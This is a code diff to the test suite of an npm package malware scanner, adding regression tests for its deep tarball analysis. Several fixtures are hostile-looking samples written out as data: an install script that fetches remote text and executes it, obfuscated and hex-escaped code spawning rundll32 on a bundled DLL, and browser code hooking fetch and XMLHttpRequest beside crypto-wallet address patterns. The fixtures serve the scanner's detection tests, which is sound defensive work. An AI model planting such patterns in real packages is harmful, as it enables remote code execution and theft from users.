@@ -5,48 +5,8 @@ import { gunzipSync, gzipSync } from 'node:zlib';
 
 import { analyzePackageTarball } from '../src/scanner/package-content.js';
 import { Severity } from '../src/scanner/types.js';
-
-interface TestEntry {
-  readonly path: string;
-  readonly content: string | Buffer;
-  readonly type?: string;
-  readonly linkPath?: string;
-}
-
-function writeTarString(target: Buffer, value: string, offset: number, length: number): void {
-  target.write(value, offset, Math.min(length, Buffer.byteLength(value)), 'utf8');
-}
-
-function writeTarOctal(target: Buffer, value: number, offset: number, length: number): void {
-  const encoded = `${value.toString(8).padStart(length - 1, '0')}\0`;
-  target.write(encoded, offset, length, 'ascii');
-}
-
-function makeTarball(entries: readonly TestEntry[]): Buffer {
-  const blocks: Buffer[] = [];
-  for (const entry of entries) {
-    const data = typeof entry.content === 'string' ? Buffer.from(entry.content) : entry.content;
-    const header = Buffer.alloc(512);
-    writeTarString(header, entry.path, 0, 100);
-    writeTarOctal(header, 0o644, 100, 8);
-    writeTarOctal(header, 0, 108, 8);
-    writeTarOctal(header, 0, 116, 8);
-    writeTarOctal(header, data.length, 124, 12);
-    writeTarOctal(header, 0, 136, 12);
-    header.fill(0x20, 148, 156);
-    header[156] = (entry.type ?? '0').charCodeAt(0);
-    if (entry.linkPath) writeTarString(header, entry.linkPath, 157, 100);
-    writeTarString(header, 'ustar\0', 257, 6);
-    writeTarString(header, '00', 263, 2);
-    const checksum = header.reduce((sum, byte) => sum + byte, 0);
-    header.write(`${checksum.toString(8).padStart(6, '0')}\0 `, 148, 8, 'ascii');
-    blocks.push(header, data);
-    const padding = (512 - (data.length % 512)) % 512;
-    if (padding > 0) blocks.push(Buffer.alloc(padding));
-  }
-  blocks.push(Buffer.alloc(1024));
-  return gzipSync(Buffer.concat(blocks));
-}
+import { StaticAnalyzer } from '../src/scanner/static-rules.js';
+import { makeTarball } from './helpers/package-tarball.js';
 
 function integrity(archive: Buffer): string {
   return `sha512-${createHash('sha512').update(archive).digest('base64')}`;
@@ -93,10 +53,10 @@ describe('package-content deep scanner', () => {
       entry.ruleId === 'content-obfuscated-exec' && entry.severity === Severity.High));
   });
 
-  it('detects files that combine networking and process execution', () => {
+  it('detects a local network response flowing into a process command', () => {
     const archive = makeTarball([{
       path: 'package/install.js',
-      content: 'const { exec } = require("child_process");\nfetch("https://example.test/tool");\nexec("tool");\n',
+      content: 'const { exec } = require("child_process");\nconst response = await fetch("https://example.test/tool");\nconst command = await response.text(); exec(command);\n',
     }]);
     const result = analyzePackageTarball(archive);
 
@@ -180,5 +140,77 @@ describe('package-content deep scanner', () => {
     const result = analyzePackageTarball(archive);
 
     assert.strictEqual(result.findings.filter((entry) => entry.ruleId === 'content-native-binary').length, 1);
+  });
+
+  it('integrates concealed native execution with metadata scoring and archive deduplication', () => {
+    const source = "require('child_'+'process')['sp'+'awn']('rund'+'ll32', ['native.dll,Entry']);";
+    const result = analyzePackageTarball(makeTarball([
+      { path: 'package/install.js', content: source },
+      { path: 'package/duplicate.js', content: source },
+      { path: 'package/native.dll', content: Buffer.from([0, 1]) },
+    ]));
+    const report = new StaticAnalyzer().analyze('', {
+      name: 'native-regression', version: '1.0.0', scripts: { install: 'node install.js' },
+    }, result.findings, result.summary);
+    assert.equal(result.summary.status, 'complete');
+    assert.equal(result.findings.filter(f => f.ruleId === 'content-concealed-native-exec').length, 1);
+    assert.equal(report.score, 74);
+    assert.equal(report.overallLevel, 'suspicious');
+  });
+
+  it('integrates browser interception evidence without relying on an install hook', () => {
+    const source = String.raw`
+      const eth = /0x[a-fA-F0-9]{40}/g;
+      const btc = /bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71}/g;
+      fetch = async function(input) { return new Response(await previous(input)); };
+      XMLHttpRequest.prototype.send = function(body) { return savedSend.call(this, body); };
+    `;
+    const result = analyzePackageTarball(makeTarball([{ path: 'package/browser.js', content: source }]));
+    const report = new StaticAnalyzer().analyze('', { name: 'browser-regression', version: '1.0.0' }, result.findings, result.summary);
+    assert.ok(result.findings.some(f => f.ruleId === 'content-browser-interception'));
+    assert.equal(report.score, 75);
+    assert.equal(report.overallLevel, 'dangerous');
+  });
+
+  it('does not classify an ordinary function beside an encoded asset as dynamic execution', () => {
+    const source = `const asset = '${'A'.repeat(200)}'; function ordinary() { return asset; }`;
+    const result = analyzePackageTarball(makeTarball([{ path: 'package/asset.js', content: source }]));
+    assert.ok(!result.findings.some(f => f.ruleId === 'content-obfuscated-exec'));
+  });
+
+  it('does not combine dynamic-execution examples in comments or strings with encoded assets', () => {
+    for (const example of ['// new Function() => function(){}', 'const docs = "eval(payload)";']) {
+      const source = `const asset = '${'A'.repeat(200)}';\n${example}`;
+      const result = analyzePackageTarball(makeTarball([{ path: 'package/examples.js', content: source }]));
+      assert.ok(!result.findings.some(f => f.ruleId === 'content-obfuscated-exec'));
+    }
+  });
+
+  it('reports a lexical inspection budget as partial rather than silently complete', () => {
+    const source = `const encoded = '${'A'.repeat(200)}'; Function(encoded);` + '0;'.repeat(150_000);
+    const result = analyzePackageTarball(makeTarball([{ path: 'package/dense.js', content: source }]));
+    assert.equal(result.summary.status, 'partial');
+    assert.match(result.summary.reason!, /token inspection/);
+    assert.ok(result.findings.some(f => f.ruleId === 'content-scan-incomplete'));
+  });
+
+  it('keeps unrelated networking and process use as a capability rather than a high execution link', () => {
+    const source = `const cp=require('child_process'); fetch('/telemetry'); cp.exec('tool --version');`;
+    const result = analyzePackageTarball(makeTarball([{ path: 'package/install.js', content: source }]));
+    assert.ok(!result.findings.some(f => f.ruleId === 'content-network-exec'));
+    assert.ok(result.findings.some(f => f.ruleId === 'content-process-exec' && f.severity === Severity.Medium));
+  });
+
+  it('does not skip fully escaped native-loader evidence in the lexical prefilter', () => {
+    const encoded = (value: string) => [...value].map(char => `\\x${char.charCodeAt(0).toString(16)}`).join('');
+    const source = `require('${encoded('child_process')}')['${encoded('spawn')}']('${encoded('rundll32')}', ['native.dll,Entry']);`;
+    const result = analyzePackageTarball(makeTarball([{ path: 'package/install.js', content: source }]));
+    assert.ok(result.findings.some(f => f.ruleId === 'content-concealed-native-exec'));
+  });
+
+  it('does not spend the lexical budget when no lexical detector has a candidate', () => {
+    const result = analyzePackageTarball(makeTarball([{ path: 'package/data.js', content: '0;'.repeat(150_000) }]));
+    assert.equal(result.summary.status, 'complete');
+    assert.equal(result.summary.truncated, false);
   });
 });
